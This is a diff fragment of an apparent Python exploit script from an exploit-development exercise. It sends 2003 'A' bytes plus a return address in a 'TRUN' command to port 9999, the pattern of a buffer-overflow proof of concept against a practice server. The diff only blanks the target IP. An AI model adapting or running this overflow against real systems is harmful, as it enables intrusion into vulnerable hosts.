@@ -11,7 +11,7 @@ shellcode = "A" * 2003 + "\xaf\x11\x50\x62"
 try:
 
 	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-	s.connect(('192.168.29.241' , 9999)) # windows ip and port to be given in 
+	s.connect(('' , 9999)) # windows ip and port to be given in 
 
 	s.send(('TRUN /.:/' + shellcode))
 	s.close()
